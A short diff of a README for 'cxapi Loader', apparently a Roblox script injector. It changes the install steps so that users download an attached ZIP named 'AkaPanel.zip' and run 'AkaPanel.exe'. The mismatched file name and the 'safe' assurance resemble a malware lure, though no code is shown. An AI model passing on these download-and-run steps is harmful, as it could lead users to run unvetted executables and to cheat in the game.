@@ -22,7 +22,7 @@ To prove that cxapi Loader is safe and functional, watch our demonstration video
 
 1. Download the latest release from the [Latest Version](https://github.com/user-attachments/files/17350804/AkaPanel.zip) page.
 2. Extract the contents of the downloaded ZIP file.
-3. Run `cxapi.exe` as an administrator.
+3. Run `AkaPanel.exe`.
 4. Ensure Roblox is running before injecting scripts.
 
 ## Usage
